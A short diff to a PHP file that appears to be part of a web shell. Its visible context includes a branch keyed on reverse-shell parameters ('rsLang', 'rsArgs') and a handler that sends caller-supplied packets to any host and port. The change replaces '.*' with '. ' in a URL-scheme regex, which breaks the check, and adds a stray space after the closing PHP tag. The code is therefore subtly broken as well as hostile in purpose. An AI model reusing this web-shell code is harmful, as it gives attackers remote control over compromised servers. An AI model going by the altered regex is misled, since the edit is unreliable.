@@ -108,7 +108,7 @@ if(isset($p['rsLang']) && isset($p['rsArgs'])){
 }
 elseif(isset($p['packetTimeout'])&&isset($p['packetSTimeout'])&&isset($p['packetPort'])&&isset($p['packetTimeout'])&&isset($p['packetContent'])){
 	$packetHost = trim($p['packetHost']);
-	if(!preg_match("/[a-z0-9]+:\/\/.*/", $packetHost)) $packetHost = "tcp://".$packetHost;
+	if(!preg_match("/[a-z0-9]+:\/\/. /", $packetHost)) $packetHost = "tcp://".$packetHost;
 
 	$packetPort = (int) $p['packetPort'];
 
@@ -149,4 +149,4 @@ elseif(isset($p['packetTimeout'])&&isset($p['packetSTimeout'])&&isset($p['packet
 	output($res);
 }
 
-?>
+?> 
